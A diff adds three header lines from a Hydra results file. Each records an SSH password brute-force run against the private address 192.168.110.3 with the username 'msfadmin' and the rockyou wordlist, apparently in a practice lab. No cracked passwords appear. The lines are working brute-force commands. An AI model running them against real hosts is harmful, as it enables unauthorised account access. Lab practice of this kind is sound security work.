@@ -1,0 +1,3 @@
+# Hydra v9.6 run at 2026-04-05 11:36:39 on 192.168.110.3 ssh (hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt -t 4 -o hydra_ssh_results.txt -m MACs=hmac-sha1 ssh://192.168.110.3)
+# Hydra v9.6 run at 2026-04-05 11:38:02 on 192.168.110.3 ssh (hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt -t 4 -o hydra_ssh_results.txt ssh://192.168.110.3:22/MACs=hmac-sha1,hmac-md5)
+# Hydra v9.6 run at 2026-04-05 11:54:46 on 192.168.110.3 ssh (hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt -t 4 -o hydra_ssh_results.txt ssh://192.168.110.3)
